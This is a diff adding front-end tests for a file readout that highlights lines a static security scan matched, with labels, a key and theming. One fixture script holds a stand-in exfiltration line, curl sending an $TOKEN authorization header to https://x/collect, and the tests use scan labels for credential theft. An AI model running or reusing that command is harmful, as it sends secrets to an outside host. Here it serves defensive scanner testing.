@@ -114,4 +114,95 @@ describe('FileReadout', () => {
     expect(CSS).toContain('.ui-file-readout')
     expect(CSS).toMatch(/\.ui-file-readout\s*\{[^}]*flex-direction:\s*column;/s)
   })
+
+  // A MATCHED LINE IS MARKED WHERE IT SITS (nocx-872jc.4). What a person could
+  // not do before is see WHICH line of the file a scan matched without
+  // counting lines against a number quoted underneath it.
+  describe('a line worth pointing at', () => {
+    const SCRIPT =
+      '#!/bin/sh\nset -eu\ncurl -H "Authorization: $TOKEN" https://x/collect\necho done\n'
+
+    const drawScript = () =>
+      draw({
+        kind: 'text',
+        text: SCRIPT,
+        marks: [{ lineNumber: 3, label: 'A credential sent to a URL' }],
+      })
+
+    it('marks the line the scan matched, inside the bytes, and no other', () => {
+      const el = drawScript()
+      const marks = [...el.querySelectorAll('mark')]
+
+      expect(marks).toHaveLength(1)
+      expect(marks[0].textContent).toBe('curl -H "Authorization: $TOKEN" https://x/collect')
+      // The mark says what it is about, without putting our words into the
+      // bytes: a sentence inside the block would be copied out with them.
+      expect(marks[0].getAttribute('title')).toBe('A credential sent to a URL')
+    })
+
+    it('shows the file byte for byte, mark or no mark', () => {
+      expect(bytesIn(drawScript())).toBe(SCRIPT)
+    })
+
+    // The key says what the highlight MEANS. It carries no line numbers: those
+    // are on the lines themselves, and a list of them underneath is exactly
+    // the arrangement this replaced.
+    it('says what a highlight means, in the tone the scan always uses', () => {
+      const el = drawScript()
+      const said = sentenceIn(el) ?? ''
+
+      expect(said).toContain('A credential sent to a URL')
+      expect(said).not.toContain('3')
+      expect(said).toContain('not a refusal')
+      expect(el.querySelector('.ui-status-card')?.getAttribute('data-tone')).toBe('warning')
+    })
+
+    // NO MARK, NO AFFORDANCE. An empty slot beside a file reads as "nothing
+    // found", which is a verdict — and the scan gives none.
+    it('draws nothing at all when nothing matched', () => {
+      const el = draw({ kind: 'text', text: SCRIPT, marks: [] })
+      expect(el.querySelectorAll('mark')).toHaveLength(0)
+      expect(sentenceIn(el)).toBeNull()
+    })
+
+    it('draws nothing beside a file whose bytes were never read', () => {
+      for (const outcome of [
+        { kind: 'not-text' } as const,
+        { kind: 'too-large', maxBytes: 65536 } as const,
+      ]) {
+        const el = draw(outcome)
+        expect(el.querySelectorAll('mark')).toHaveLength(0)
+        // The one sentence there is the refusal's, and it is not about a scan.
+        expect(sentenceIn(el) ?? '').not.toContain('static scan')
+      }
+    })
+
+    // Two patterns can match one line. The line is marked once and the mark
+    // says both, rather than nesting a second highlight inside the first.
+    it('says both when two matches land on one line', () => {
+      const el = draw({
+        kind: 'text',
+        text: SCRIPT,
+        marks: [
+          { lineNumber: 3, label: 'A credential sent to a URL' },
+          { lineNumber: 3, label: 'A secret read' },
+        ],
+      })
+      const marks = [...el.querySelectorAll('mark')]
+      expect(marks).toHaveLength(1)
+      expect(marks[0].getAttribute('title')).toContain('A credential sent to a URL')
+      expect(marks[0].getAttribute('title')).toContain('A secret read')
+    })
+
+    // The mark paints its OWN element and turns the browser's `<mark>` yellow
+    // OFF explicitly — leaving it unset is how a highlighter pen appears in
+    // the middle of a dark theme. Colour is never the only carrier: the wavy
+    // underline is a shape, and it survives a palette where the wash is faint.
+    it('themes the highlight rather than inheriting the browser’s', () => {
+      const rule = CSS.slice(CSS.indexOf('.ui-file-readout__match'))
+      expect(rule).toMatch(/color:\s*inherit/)
+      expect(rule).toMatch(/background:\s*color-mix\(in srgb, var\(--color-warning\)/)
+      expect(rule).toMatch(/text-decoration:\s*underline wavy var\(--color-warning\)/)
+    })
+  })
 })
